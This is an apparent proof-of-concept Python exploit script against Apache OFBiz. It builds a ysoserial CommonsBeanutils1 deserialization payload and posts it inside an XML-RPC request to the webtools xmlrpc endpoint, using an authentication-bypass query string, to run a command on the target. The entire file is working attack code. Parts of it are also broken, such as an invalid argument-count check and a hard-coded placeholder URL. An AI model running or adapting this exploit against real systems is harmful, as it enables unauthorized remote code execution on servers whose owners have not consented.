import os
import subprocess
import requests
import sys

def generate_payload():

    command = 'java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial.jar CommonsBeanutils1 gedit | base64 | tr -d "\n"'

    try:
        result = subprocess.run(command, check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except subprocess.CalledProcessError as e:
        return f"Error: {e.stderr}"


    payload = f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>Methodname</methodName>
      <params>
        <param>
        <value>
          <struct>
            <member>
              <name>test</name>
              <value>
                <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{result.stdout}</serializable>
            </value>
            </member>
        </struct>
        </value>
    </param>
    </params>
    </methodCall>
    """
    return payload

def exploit_req(payload, target_url):
    header = {"Content-Type": "application/xml"}
 
    target_endpoint = f"{target_url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
 
    requests.post(target_endpoint, headers=header, data=payload, verify=False)

if __name__ == "__main__":
    payload = generate_payload()
    if sys.argv < 3:
        print("Usage: python3 exploit.py <host> <port>")
        sys.exit(0)
    else:
      target_url = "http://<host>:<port>"
      exploit_req(payload, target_url)

